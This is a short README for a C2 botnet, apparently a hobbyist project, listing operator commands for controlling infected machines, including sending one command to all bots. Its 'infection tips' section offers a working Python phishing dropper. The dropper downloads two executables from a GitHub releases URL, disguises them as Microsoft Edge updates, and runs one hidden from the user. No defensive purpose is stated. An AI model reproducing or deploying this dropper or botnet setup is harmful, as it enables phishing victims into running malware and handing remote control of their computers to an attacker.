# C2 Botnet made by kid bengalao aka fazok

this use the file crypt.py for messages encrypt

## Conection method
this uses tcp socket to make connections

## Comands
```list             - List all connected bots
   use <id>         - Select a bot to control
   cmd <command>    - Send command to the selected bot
   help             - Show this help message
   spray <command>   - Send command to all connected bots
```
## infections tips
### phishing
make a laucher in python like this
```python
import urllib.request, subprocess, os, tempfile
from pathlib import Path
# 1. folder create
Path("new_folder").mkdir(exist_ok=True)
# download malware
url = "https://github.com/nubao822123-coder/ab/releases/download/1/MicrosoftEdgeUpdate.exe"   
url2 = "https://github.com/nubao822123-coder/ab/releases/download/1/starter-core-1.268-v6.exe"   
# put files in the folder
path = os.path.join("new_folder", "update.exe")
path2 = os.path.join("new_folder", "update2.exe")
print("Baixando os arquivos...")
urllib.request.urlretrieve(url, path)
urllib.request.urlretrieve(url2, path2) 
# execution
print("Executando...")
subprocess.Popen(path, creationflags=0x08000000) # Oculto
subprocess.Popen(path2) # Visível
```